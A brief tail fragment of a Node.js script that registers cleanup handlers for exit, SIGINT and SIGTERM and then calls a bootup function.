  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()
